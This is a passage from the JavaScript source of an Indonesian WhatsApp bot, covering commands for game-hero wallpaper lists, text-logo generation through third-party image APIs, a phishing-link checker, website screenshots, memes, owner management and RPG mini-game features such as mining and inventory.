        "sylas-2",
        "sylas",
        "sejuani-3",
        "fiora-4",
        "nunu-3",
        "norgana-3",
        "kayle-3",
        "brand-3",
        "anivia-2",
        "ahri-5",
        "yorick-3",
        "rengar-4",
        "fizz-4",
        "fizz-3",
        "corki-3",
        "zed-4",
        "rakan-2",
        "leblanc-3",
        "kaisa-5",
        "jarvaniv",
        "ivern",
        "irelia-7",
        "fiora-5",
        "evelynn-4",
        "camille-3",
        "yuumi-2",
        "yuumi",
        "lux-4",
        "lux-3",
        "katarina-4",
        "jayce-3",
        "graves-4",
        "ezreal-5"`) 
}
break
case 'listwallpaperaov': {
if (!text) return newReply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *allain*
│2 ▸ *allain-2*
│3 ▸ *kahlii-3*
│4 ▸ *nakroth-4*
│5 ▸ *preyta-2*
│6 ▸ *skud-2*
│7 ▸ *taara-4*
│8 ▸ *valhein-4*
│9 ▸ *arum-4*
│10 ▸ *butterfly-6*
│11 ▸ *capheny-3*
│12 ▸ *elandorr-2*
│13 ▸ *ilumia-3*
│14 ▸ *ishar-4*
│15 ▸ *lauriel-6*
│16 ▸ *laville*
│17 ▸ *liliana-5*
│18 ▸ *nurad-8*
│19 ▸ *quillen-5*
│20 ▸ *rouie*
│21 ▸ *rouie-2*
│22 ▸ *taara-3*
│23 ▸ *telannas-5*
│24 ▸ *yena-4*
│25 ▸ *yena-5*
│26 ▸ *zata*
│27 ▸ *ata*
│28 ▸ *lauriel-5*
│29 ▸ *qi-3*
│30 ▸ *roxie-3*
│31 ▸ *wukong-5*
│32 ▸ *aleister-2*
│33 ▸ *amily-3*
│34 ▸ *arthur-3*
│35 ▸ *arum-3*
│36 ▸ *astrid-2*
│37 ▸ *dirak*
│38 ▸ *dirak-2*
│39 ▸ *grakk-5*
│40 ▸ *hayate-4*
│41 ▸ *ishar-2*
│42 ▸ *ishar-3*
│43 ▸ *jinna-2*
│44 ▸ *keera*
│45 ▸ *keera-3*
│46 ▸ *lauriel-4*
│47 ▸ *nax*
│48 ▸ *natalya-5*
│49 ▸ *quillen-4*
│50 ▸ *raz-3*
│51 ▸ *richter-2*
│52 ▸ *ryoma-4*
│53 ▸ *telannas-4*
│54 ▸ *ulen-6*
│55 ▸ *valhein-3*
│56 ▸ *violet-7*
│57 ▸ *yorn-4*
│58 ▸ *zill-3*
│59 ▸ *ignis-2*
│60 ▸ *lubu-2*
│61 ▸ *naloch-2*
│62 ▸ *sephera-3*
│63 ▸ *butterfly-5*
│64 ▸ *diaochan-4*
│65 ▸ *elandoor*
│66 ▸ *krizzix-2*
│67 ▸ *nina-2*
│68 ▸ *natalya-3*
│69 ▸ *veera-3*
│70 ▸ *violet-6*
│71 ▸ *yena-2*
│72 ▸ *yena-3*
│73 ▸ *krizziz*
│74 ▸ *nurad-7*
│75 ▸ *volkath*
│76 ▸ *volkath-2*
│77 ▸ *airi-4*
│78 ▸ *arduin-3*
│79 ▸ *enzo-3*
│80 ▸ *hayate-3*
│81 ▸ *krixi-3*
│82 ▸ *nurad-6*
│83 ▸ *quillen-3*
│84 ▸ *telannas-3*
│85 ▸ *wisp-2*
│86 ▸ *zip-2*
│87 ▸ *gildur-2*
│88 ▸ *ishar*
│89 ▸ *tulen-5*
│90 ▸ *amily-2*
│91 ▸ *annette-3*
│92 ▸ *arthur-2*
│93 ▸ *butterfly-4*
│94 ▸ *errol-2*
│95 ▸ *joker*
│96 ▸ *kahlii-2*
│97 ▸ *kilgroht*
│98 ▸ *lauriel-3*
│99 ▸ *nurad-5*
│100 ▸ *arduin-2*
│101 ▸ *darcy-2*
│102 ▸ *florentino-3*
│103 ▸ *noren*
│104 ▸ *quillen-2*
│105 ▸ *ryoma-5*
│106 ▸ *sephera-3*
│107 ▸ *violet-5*
│108 ▸ *airi-3*
│109 ▸ *diaochan-3*
│110 ▸ *diaochanlubu*
│111 ▸ *elsuroxie*
│112 ▸ *lindis-3*
│113 ▸ *taara-2*
│114 ▸ *toro-2*
│115 ▸ *tulen-4*
│116 ▸ *violet-4*
│117 ▸ *wonderwoman*
│118 ▸ *ybneth*
│119 ▸ *zill-2*
│120 ▸ *arum-2*
│121 ▸ *florentino-2*
│122 ▸ *liliana-4*
│123 ▸ *nurad-4*
│124 ▸ *yorn-3*
│125 ▸ *zip*
│126 ▸ *annette-2*
│127 ▸ *qi*
│128 ▸ *qi-2*
│129 ▸ *celica*
│130 ▸ *capheny-2*
│131 ▸ *diaochan-2*
│132 ▸ *elsu-2*
│133 ▸ *ilumia-2*
│134 ▸ *krixi-2*
│135 ▸ *narja-2*
│136 ▸ *nurad-3*
│137 ▸ *preyta*
│138 ▸ *telannas-2*
│139 ▸ *valhein*
│140 ▸ *veera-2*
│141 ▸ *veres-2*
│142 ▸ *yorn-2*
│143 ▸ *zephys-2*
│144 ▸ *airi-2*
│145 ▸ *annette*
│146 ▸ *baldum*
│147 ▸ *butterfly-3*
│148 ▸ *elsu-2*
│149 ▸ *errol*
│150 ▸ *fennik*
│151 ▸ *lauriel-2*
│152 ▸ *liliana-2*
│153 ▸ *liliana-3*
│154 ▸ *lindis-2*
│155 ▸ *nurad-2*
│156 ▸ *nakroth-2*
│157 ▸ *nakroth-3*
│158 ▸ *natalya-2*
│159 ▸ *raz-2*
│160 ▸ *ryoma-2*
│161 ▸ *slimz*
│162 ▸ *teemee*
│163 ▸ *tulen-2*
│164 ▸ *tulen-3*
│165 ▸ *violet-3*
│166 ▸ *wiro*
│167 ▸ *wukong-3*
│168 ▸ *wukong-4*
│169 ▸ *zill*
│170 ▸ *aleister*
│171 ▸ *alice*
│172 ▸ *arduin*
│173 ▸ *arthur*
│174 ▸ *azzenka*
│175 ▸ *batman*
│176 ▸ *butterfly-2*
│177 ▸ *cresh*
│178 ▸ *darcy*
│179 ▸ *diaochan*
│180 ▸ *enzo-3*
│181 ▸ *hayate-2*
│182 ▸ *jinna*
│183 ▸ *lubu*
│184 ▸ *nganga*
│185 ▸ *violet-2*
│186 ▸ *wukong-2*
│187 ▸ *zanis-2*
│188 ▸ *florentino*
│189 ▸ *gildur*
│190 ▸ *ignis*
│191 ▸ *naloch*
│192 ▸ *narja*
│193 ▸ *nakroth*
│194 ▸ *omen*
│195 ▸ *payna*
│196 ▸ *raz*
│197 ▸ *rourke*
│198 ▸ *roxie*
│199 ▸ *ryoma*
│200 ▸ *skud*
│201 ▸ *taara*
│202 ▸ *toro*
│203 ▸ *valhein*
│204 ▸ *veres*
│205 ▸ *violet*
│206 ▸ *wisp*
│207 ▸ *wukong*
│208 ▸ *wonderwoman*
│209 ▸ *xeniel*
│210 ▸ *yorn* 
│211 ▸ *zanis*
│212 ▸ *elsu*
│213 ▸ *flash*
│214 ▸ *hayate*
│215 ▸ *ilumia*
│216 ▸ *kahlii*
│217 ▸ *Krixi*
│218 ▸ *lauriel*
│219 ▸ *liliana*
│220 ▸ *lindis*
│221 ▸ *nina*
│222 ▸ *nurad*
│223 ▸ *natalya*
│224 ▸ *quillen*
│225 ▸ *richter*
│226 ▸ *sephera*
│227 ▸ *supermen*
│228 ▸ telannas*
│229 ▸ *thane*
│230 ▸ *airi*
│231 ▸ *amily*
│232 ▸ *arum*
│233 ▸ *astrid*
│234 ▸ *butterfly*
│235 ▸ *capheny*
│236 ▸ *enzo*
│237 ▸ *tulen*
│238 ▸ *veera*
│239 ▸ *yena*
│240 ▸ *ryoma-4*
│241 ▸ *zephys*
│242 ▸ *zuka*
│
╰────────────˧`) 
}
break
case 'listwallpaperml': {
if (!text) return newReply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *aldous*
│2 ▸ *alice-2*
│3 ▸ *angela-2*
│4 ▸ *argus-2*
│5 ▸ *chou*
│6 ▸ *chou-2*
│7 ▸ *estes*
│8 ▸ *eudora*
│9 ▸ *eudora-2*
│10 ▸ *granger*
│11 ▸ *granger-2*
│12 ▸ *gusion-3*
│13 ▸ *hanabi-2*
│14 ▸ *hanzo*
│15 ▸ *helcurt*
│16 ▸ *layla-3*
│17 ▸ *lesley-4*
│18 ▸ *lunox-2*
│19 ▸ *odette-3*
│20 ▸ *saber*
│21 ▸ *thamuz*
│22 ▸ *vexana*
│23 ▸ *argus*
│24 ▸ *dyrroth*
│25 ▸ *esmeralda-2*
│26 ▸ *kadita-2*
│27 ▸ *lancelot*
│28 ▸ *leomord-2*
│29 ▸ *lylia*
│30 ▸ *vale*
│31 ▸ *valir*
│32 ▸ *xborg*
│33 ▸ *zhask*
│34 ▸ *alice*
│35 ▸ *alpha*
│36 ▸ *athena*
│37 ▸ *badang*
│38 ▸ *balmond*
│39 ▸ *bane*
│40 ▸ *diggie*
│41 ▸ *trunks*
│42 ▸ *fanny-2*
│43 ▸ *fanny-3*
│44 ▸ *freya*
│45 ▸ *guinevere*
│46 ▸ *gusion*
│47 ▸ *gusion-2*
│48 ▸ *hanabi*
│49 ▸ *harith*
│50 ▸ *harith-2*
│51 ▸ *hayabusa-2*
│52 ▸ *kadita*
│53 ▸ *kagura-2*
│54 ▸ *kagura-3*
│55 ▸ *karina-2*
│56 ▸ *kimmy*
│57 ▸ *layla-2*
│58 ▸ *leomord*
│59 ▸ *lesley-2*
│60 ▸ *lesley-3*
│61 ▸ *lunox*
│62 ▸ *nartis*
│63 ▸ *niya-2*
│64 ▸ *nana*
│65 ▸ *nana-2*
│66 ▸ *natalia*
│67 ▸ *natalia-2*
│68 ▸ *odette-2*
│69 ▸ *pharsa*
│70 ▸ *rafaela-2*
│71 ▸ *selena-2*
│72 ▸ *zilong*
│73 ▸ *alucard*
│74 ▸ *angela*
│75 ▸ *bruno*
│76 ▸ *change*
│77 ▸ *claude*
│78 ▸ *fanny*
│79 ▸ *hayabusa*
│80 ▸ *hilda*
│81 ▸ *hylos*
│82 ▸ *kagura*
│83 ▸ *karina*
│84 ▸ *karrie*
│85 ▸ *layla*
│86 ▸ *lesley*
│87 ▸ *lolita*
│88 ▸ *ninotaur*
│89 ▸ *ninsittar*
│90 ▸ *niya*
│91 ▸ *noskov*
│92 ▸ *odette*
│93 ▸ *rafaela*
│94 ▸ *selena*
│
╰────────────˧`) 
}
break

case 'banneroflol':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&banner=${m3}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listbanneroflol': {
if (!text) return newReply(`"ahri-2",
"neeko",
"nocturne",
"shen-2",
"veigar",
"rakanayah-2",
"zoe-2",
"pantheon-2",
"rammus",
"udyr",
"darius-2",
"ekko-2",
"lablanc",
"leona",
"nissfotune",
"poppy",
"quinn",
"talon-2",
"akali-2",
"irelia-2",
"jinx-2",
"nordekaiser",
"pyke-2",
"renekton",
"rengar",
"sivir",
"sona",
"soraka",
"tristana",
"warwick",
"yuumi",
"ziggs",
"leesin",
"lulu",
"lux",
"naster-yi",
"norgana",
"nasus",
"pantheon",
"pyke",
"qiyana",
"rakan",
"rakanxayah",
"riven",
"shen",
"sylas",
"talon",
"teemo",
"thresh",
"tryndamere",
"varus",
"vayne",
"velkoz",
"vladimir",
"yasuo",
"zed",
"zoe",
"hecarim",
"heimerdinger",
"illaoi",
"irelia",
"ivern",
"janna",
"jarvan-iv",
"jax",
"jayce",
"jhin",
"jinx",
"kaisa",
"kalista",
"karma",
"karthus",
"kassadin",
"katarina",
"kayle",
"kayn",
"kennen",
"khazix",
"kindred",
"kled",
"kogmaw",
"aatrox",
"ahri",
"akali",
"alistar",
"amumu",
"anivia",
"annie",
"ashe",
"aurelionsol",
"azir",
"bard",
"blitzcrank",
"brand",
"braum",
"caitlyn",
"camille",
"cassiopeia",
"chogath",
"corki",
"darius",
"diana",
"drmundo",
"draven",
"ekko",
"elise",
"evelynn",
"ezreal",
"fiddlesticks",
"fiora",
"fizz",
"galio",
"gangplank",
"garen",
"gnar",
"gragas",
"graves"`)
}
break

case 'dragonballfb':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&character=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listdragonballfb': {
if (!text) return newReply(`╭─▸ *LIST CHARACTER*
│
├❖ *LIST*
│1 ▸ *caulifla*
│2 ▸ *cooler*
│3 ▸ *cumber*
│4 ▸ *hit*
│5 ▸ *kale*
│6 ▸ *kaminoren*
│7 ▸ *gokuui*
│8 ▸ *xenogokuss3*
│9 ▸ *xenogokuss4*
│10 ▸ *xenovegeta*
│11 ▸ *xenovegito*
│12 ▸ *android-18*
│13 ▸ *blackgoku*
│14 ▸ *bulma*
│15 ▸ *frieza*
│16 ▸ *gotenks-2*
│17 ▸ *kaio*
│18 ▸ *krillinandroid-18*
│19 ▸ *launch*
│20 ▸ *nutenroshi-2*
│21 ▸ *oldkai*
│22 ▸ *oolong*
│23 ▸ *pilaf*
│24 ▸ *tienshinhan*
│25 ▸ *trunks-3*
│26 ▸ *bardock*
│27 ▸ *gotenks*
│28 ▸ *nutenroshi*
│29 ▸ *piccolo*
│30 ▸ *songoku-2*
│31 ▸ *songoku-3*
│32 ▸ *songoten*
│33 ▸ *trunks-2*
│34 ▸ *vegeta-2*
│35 ▸ *vegito*
│36 ▸ *krillin*
│37 ▸ *najinbuu*
│38 ▸ *songohan*
│39 ▸ *songoku*
│40 ▸ *trunks*
│41 ▸ *vegeta*
│
╰────────────˧`)
}
break

case 'cekphising': case 'cekScam': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if  (!text||!text.startsWith('https://')) return newReply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://ryudev.biz.id`)
newReply(mess.wait)
let cek = await rapid.cekScam(text)
console.log(cek.isScam)
let cekk = `${cek.isScam}`
if(cekk == 'true'){
m.reply(`LINK ${text}\nTERDETEKSI SEBAGAI *LINK PHISING/SCAM* HARAP BERHATI HATI DAN JANGAN MENGKLIK LINK TERSEBUT!`)
}
else if (cekk == 'false'){
m.reply(`LINK ${text}\nTERDETEKSI *AMAN* \nNAMUN PERLU DIINGAT TETAP BERHATI HATI SAAT MENGUNJUNGI LINK TERSEBUT TIDAK SEMUA LINK DAPAT TERDEKSI DENGAN BAIK JADI HARAP JANGAN MASUKKAN INFORMASI SENSITIF DAN BERHATI HATILAH MENGUNDUH SESUATU DALAM WEBSITE TERSEBUT`)
    
}
else{
m.reply('TIDAK DAPAT MENDETEKSI')
}
}
limitAdd(m.sender , limit)
break
case 'ssweb': case 'sswebpc':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if  (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://ryudev.biz.id`)
newReply(mess.wait)
let ss = await getBuffer(`https://skizo.tech/api/ssweb?type=dekstop&url=${text}&apikey=${setting.XznKey}`)
try{
await Aira.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'ssweb2': case 'sswebhp':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if  (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://ryudev.biz.id`)
newReply(mess.wait)
let ss = await getBuffer(`https://skizo.tech/api/ssweb?type=phone&url=${text}&apikey=${setting.XznKey}`)
try{
await Aira.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case "couple": case"ppcp":{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
newReply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
Aira.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
Aira.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
limitAdd(m.sender, limit)
break
//darkjokes
case 'darkjokes': case 'darkjoke':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let darkjoke = await getBuffer(`https://api.ouzen.xyz/randomimage/darkjoke?apikey=${setting.ZenzKey}`)
try{
await Aira.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'meme':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let meme = await fetchJson(`https://skizo.tech/api/randommeme?apikey=${setting.XznKey}`)
try{
const hasil = meme.media
const capt = meme.caption
await Aira.sendFile(m.chat, hasil, null, `${capt}`, m)
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'memeindo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let darkjoke = await getBuffer(`https://api.ouzen.xyz/randomimage/memeindo?apikey=${setting.ZenzKey}`)
try{
await Aira.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
//ephoto360
case "1917text":
            case "angelwing":
            case "announofwin":
            case "birthdaycake":
            case "capercut":
            case "cardhalloween":
            case "christmascard":
            case "christmasseason":
            case "covergamepubg":
            case "covergraffiti":
            case "dragonfire":
            case "embroider":
            case "fabrictext":
            case "facebookgold":
            case "facebooksilver":
            case "funnyanimations":
            case "funnyhalloween":
            case "galaxybat":
            case "galaxywallpaper":
            case "generalexam":
            case "glowingtext":
            case "graffiti3d":
            case "graffititext":
            case "graffititext2":
            case "graffititext3":
            case "greetingcardvideo":
            case "halloweenbats":
            case "heartcup":
            case "heartflashlight":
            case "horrorletter":
            case "icetext":
            case "instagramgold":
            case "instagramsilver":
            case "lightningpubg":
            case "lovecard":
            case "lovelycute":
            case "masteryavatar":
            case "merrycard":
            case "messagecoffee":
            case "metalstar":
            case "milkcake":
            case "modengold3":
            case "moderngold":
            case "moderngold2":
            case "moderngoldsilver":
            case "nameonheart":
            case "noeltext":
            case "projectyasuo":
            case "pubgbirthday":
            case "pubgglicthvideo":
            case "pubgmascotlogo":
            case "puppycute":
            case "realembroidery":
            case "retrotext":
            case "rosebirthday":
            case "snowontext":
            case "starsnight":
            case "summerbeach":
            case "sunglightshadow":
            case "textcakes":
            case "texthalloween":
            case "textonglass":
            case "textsky":
            case "thundertext":
            case "twittergold":
            case "twittersilver":
            case "viettel":
            case "vintagetelevision":
            case "watercolor2":
            case "womansday":
            case "writeblood":
            case "writegalaxy":
            case "writehorror":
            case "youtubegold":
            case "youtubesilver":
case "zombie3d": {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let ephoto360= await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await Aira.sendMessage(m.chat, {image: ephoto360, caption: "Done kak"}, {quoted: m})
} catch (err){
newReply('Halo Kak, Penulisan Teksnya Tersebut Salah, Mungkin Terlalu Panjang') 
}
limitAdd(m.sender, limit)
}
break
//textpro menu
case 'blackpink':case 'rainbow2':case 'water_pipe':case 'halloween':case 'sketch':case 'sircuit':case 'discovery':case 'metallic2':case 'fiction':case 'demon':case 'transformer':case 'berry':case 'thunder':case 'magma':case '3dstone':case 'neon':case 'glitch':case 'harry_potter':case 'embossed':case 'broken':case 'papercut':case 'gradient':case 'glossy':case 'watercolor':case 'multicolor':case 'neon_devil':case 'underwater':case 'bear':case 'wonderfulg':case 'christmas':case 'neon_light':case 'snow':case 'cloudsky':case 'luxury2':case 'gradient2':case 'summer':case 'writing':case 'engraved':case 'summery':case '3dglue':case 'metaldark':case 'neonlight':case 'oscar':case 'minion':case 'holographic':case 'purple':case 'glossyb':case 'deluxe2':case 'glossyc':case 'fabric':case 'neonc':case 'newyear':case 'newyear2':case 'metals':case 'xmas':case 'blood':case 'darkg':case 'joker':case 'wicker':case 'natural':case 'firework':case 'skeleton':case 'balloon':case 'balloon2':case 'balloon3':case 'balloon4':case 'balloon5':case 'balloon6':case 'balloon7':case 'steel':case 'gloss':case 'denim':case 'decorate':case 'decorate2':case 'peridot':case 'rock':case 'glass':case 'glass2':case 'glass3':case 'glass4':case 'glass5':case 'glass6':case 'glass7':case 'glass8':case 'captain_as2':case 'robot':case 'equalizer':case 'toxic':case 'sparkling':case 'sparkling2':case 'sparkling3':case 'sparkling4':case 'sparkling5':case 'sparkling6':case 'sparkling7':case 'decorative':case 'chocolate':case 'strawberry':case 'koifish':case 'bread':case 'matrix':case 'blood2':case 'neonligth2':case 'thunder2':case '3dbox':case 'neon2':case 'roadw':case 'bokeh':case 'gneon':case 'advanced':case 'dropwater':case 'wall':case 'chrismast':case 'honey':case 'drug':case 'marble':case 'marble2':case 'ice':case 'juice':case 'rusty':case 'abstra':case 'biscuit':case 'wood':case 'scifi':case 'metalr':case 'purpleg':case 'shiny': case 'jewelry':case 'jewelry2':case 'jewelry3':case 'jewelry4':case 'jewelry5':case 'jewelry6':case 'jewelry7':case 'jewelry8':case 'metalh':case 'golden':case 'glitter':case 'glitter2':case 'glitter3':case 'glitter4':case 'glitter5':case 'glitter6':case 'glitter7':case 'metale':case 'carbon':case 'candy':case 'metalb':case 'gemb':case '3dchrome':case 'metalb2':case 'metalg':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await Aira.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
} catch (err){
newReply(mess.error.api) 
}
limitAdd(m.sender, limit)
}
break
case 'addowner':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
ownerNumber.push(users)
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
newReply(`Sukses`)
} else {
newReply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break
case 'delowner':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag/jid*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
if (!ownerNumber.includes(users)) return newReply(`Dia bukan owner`)
ownerNumber.splice(ownerNumber.indexOf(users, 1))
newReply(`Sukses`)
} else {
newReply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break

case 'inv': case 'me': case 'inventori': case 'inventory': case 'profile':{
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*\n\n`
 teksehmazeh += `*❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n`
 teksehmazeh += `*◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n`
 teksehmazeh += `*🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n`
 teksehmazeh += `*🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n`
 teksehmazeh += `*💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n`
 teksehmazeh += `*⏺️ Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : getLimit(m.sender, limitCount, limit)}\n`
 teksehmazeh += `*💰 Money* : $${getBalance(m.sender, balance) ? getBalance(m.sender, balance) : 0}\n`
 teksehmazeh += `*🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n`
 teksehmazeh += `*HUNT RESULT*\n`
 teksehmazeh += `*🐟 Fish* :` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`
 teksehmazeh += `*🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n`
 teksehmazeh += `*🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n`
 teksehmazeh += `*🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n`
 teksehmazeh += `*🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n`
 teksehmazeh += `*🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n`
 teksehmazeh += `🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n`
 teksehmazeh += `🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n`
 teksehmazeh += `❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n`
 teksehmazeh += `🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n`
 teksehmazeh += `🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
await Aira.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {  
title: `Aira.ai`,
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'mining': case 'mine':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return newReply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await Aira.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted: m})
}, 7000)
setTimeout( async () => {
await Aira.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break
case 'beli': case 'buy':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!text) return newReply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
